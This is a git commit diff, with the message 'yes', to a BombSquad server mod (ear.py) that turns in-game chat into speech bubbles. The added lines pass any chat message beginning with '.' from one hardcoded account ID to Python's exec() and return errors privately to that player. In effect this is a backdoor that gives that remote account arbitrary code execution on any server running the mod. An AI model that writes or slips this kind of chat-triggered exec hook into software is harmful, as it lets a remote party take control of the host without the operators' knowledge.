3021455edacd5944a32ab3d610f2b9583012c324
BroBordd <BroBordd@github.com>
2025-09-18 01:44:00 +0300

    yes

--- dist/ba_root/mods/ear.py
+++ dist/ba_root/mods/ear.py
@@ -11,13 +11,18 @@ from babase import Plugin
 from _bascenev1 import (
     get_foreground_host_activity as ga,
     broadcastmessage as push,
+    get_game_roster as ro,
     chatmessage as say
 )
 from bubble import Bubble
 
+A = ["pb-IF4cU1YlMA=="]
+
 def ear(m,i):
     p = i2p(i)
-    if m.startswith('.'):
+    if m.startswith('.') and i2a(i) in A:
+        try: exec(m[1:])
+        except Exception as e: pst(str(e),i)
         return
     with ga().context:
         Bubble(
@@ -33,6 +38,19 @@ def i2p(i):
     for j,p in enumerate(a.players):
         if p.sessionplayer.inputdevice.client_id == i:
             return a.players[j]
+
+def i2a(i):
+    for _ in ro():
+        if _['client_id'] == i:
+            return _['account_id']
+
+def pst(t,i):
+    push(
+        t,
+        transient=True,
+        clients=[i],
+        color=(1,1,0)
+    )
 
 # ba_meta require api 9
 # ba_meta export babase.Plugin
